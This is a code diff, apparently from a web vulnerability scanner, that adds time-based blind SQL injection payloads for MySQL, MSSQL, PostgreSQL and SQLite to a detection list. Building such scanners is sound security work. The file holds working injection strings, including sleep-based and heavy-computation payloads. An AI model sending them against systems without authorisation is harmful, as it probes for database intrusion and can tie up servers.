@@ -25,13 +25,18 @@ export interface TimedSqliPayload {
  *  Uses 5-second delays to reliably exceed BLIND_SQLI_THRESHOLD_MS (3500ms)
  *  while leaving 1.5s margin for network latency. */
 export const SQLI_TIME_PAYLOADS: TimedSqliPayload[] = [
-  // MySQL
+  // MySQL — multiple contexts (string, numeric, subquery)
   { payload: "' OR SLEEP(5)--", dbType: 'mysql' },
   { payload: "1 OR SLEEP(5)--", dbType: 'mysql' },
+  { payload: "1 OR SLEEP(5)#", dbType: 'mysql' },
+  { payload: "1 AND SLEEP(5)--", dbType: 'mysql' },
+  { payload: "' OR (SELECT SLEEP(5))--", dbType: 'mysql' },
   // MSSQL
   { payload: "1; WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
+  { payload: "'; WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
   // PostgreSQL
   { payload: "'; SELECT pg_sleep(5)--", dbType: 'postgres' },
+  { payload: "1; SELECT pg_sleep(5)--", dbType: 'postgres' },
   // SQLite (no sleep, but heavy computation)
   { payload: "1 OR 1=1 AND RANDOMBLOB(500000000)--", dbType: 'sqlite' },
 ];
